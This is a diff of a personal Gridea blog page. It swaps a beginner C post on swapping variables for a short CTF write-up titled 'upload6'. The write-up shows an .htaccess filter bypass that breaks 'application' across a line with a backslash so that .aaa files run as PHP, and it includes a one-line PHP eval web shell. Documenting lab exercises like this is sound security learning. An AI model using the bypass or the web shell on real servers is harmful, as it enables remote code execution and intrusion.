@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>第二篇：值的互换 | Gridea</title>
+<title>3,upload6 | Gridea</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
@@ -24,18 +24,16 @@
 
 
 
-    <meta name="description" content="源码:
-1)/*
-目的：搞会变量的互换
-/
-#include&lt;stdio.h&gt;
-int main(void)
-{
-int i = 4;
-int j = 5;
-/
-i = j;
-j = i;不能将j与i进行互换，正确的做法是引用3..." />
+    <meta name="description" content=".htaccess文件换行绕过
+上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。
+.htaccess支持换行编写所以使用换行可以直接上传成功并解析。
+
+题目
+
+upload6
+
+
+过滤掉applicatio..." />
     <meta name="keywords" content="" />
   </head>
   <body>
@@ -107,44 +105,55 @@ j = i;不能将j与i进行互换，正确的做法是引用3..." />
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
           <div class="post-detail">
-            <h2 class="post-title">第二篇：值的互换</h2>
-            <div class="post-date">2020-10-13</div>
+            <h2 class="post-title">3,upload6</h2>
+            <div class="post-date">2020-10-29</div>
             
             <div class="post-content" v-pre>
-              <p>源码:<br>
-1)/*<br>
-目的：搞会变量的互换<br>
-<em>/<br>
-#include&lt;stdio.h&gt;<br>
-int main(void)<br>
-{<br>
-int i = 4;<br>
-int j = 5;<br>
-/</em><br>
-i = j;<br>
-j = i;不能将j与i进行互换，正确的做法是引用3个：i，j，k<br>
-<em>/<br>
-int k;<br>
-k = i;<br>
-i = j;<br>
-j = k;<br>
-printf(&quot;i = %d; j = %d; k = %d&quot;, i, j, k);<br>
-return 0;<br>
-}<br>
-/</em><br>
-最终结果i=5，j=4，k=4<br>
-*/<br>
-##挂个图<br>
-<img src="https://crlrlc.github.io//post-images/1603884283299.png" alt="" loading="lazy"></p>
+              <h3 id="htaccess文件换行绕过">.htaccess文件换行绕过</h3>
+<p>上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。</p>
+<p>.htaccess支持换行编写所以使用换行可以直接上传成功并解析。</p>
+<ul>
+<li>题目</li>
+</ul>
+<p>upload6</p>
+<ul>
+<li>
+<p>过滤掉application，则使用换行绕过</p>
+</li>
+<li>
+<p>.htaccess</p>
+</li>
+</ul>
+<pre><code>AddType application/x-httpd-php .aaa
+</code></pre>
+<p>提示：内容不能有application</p>
+<p>尝试使用.htaccess文件换行绕过。</p>
+<ul>
+<li>.htaccess</li>
+</ul>
+<pre><code>AddType appli\
+cation/x-httpd-php .aaa
+</code></pre>
+<ul>
+<li>1.aaa</li>
+</ul>
+<pre><code>&lt;?php
+@eval($_POST['cmd']);
+</code></pre>
+<p>##步骤如下：<br>
+<img src="https://crlrlc.github.io//post-images/1603964256264.png" alt="" loading="lazy"><br>
+<img src="https://crlrlc.github.io//post-images/1603964263023.png" alt="" loading="lazy"><br>
+<img src="https://crlrlc.github.io//post-images/1603964269523.png" alt="" loading="lazy"><br>
+<img src="https://crlrlc.github.io//post-images/1603964275363.png" alt="" loading="lazy"></p>
 
             </div>
             
             
               <div class="next-post">
                 <div class="next">下一篇</div>
-                <a href="https://crlrlc.github.io/post/di-yi-ge-gredea-de-wen-zhang/">
+                <a href="https://crlrlc.github.io/post/di-er-ci-da-ba/">
                   <h3 class="post-title">
-                    第一个gridea的文章
+                    第二次打靶
                   </h3>
                 </a>
               </div>
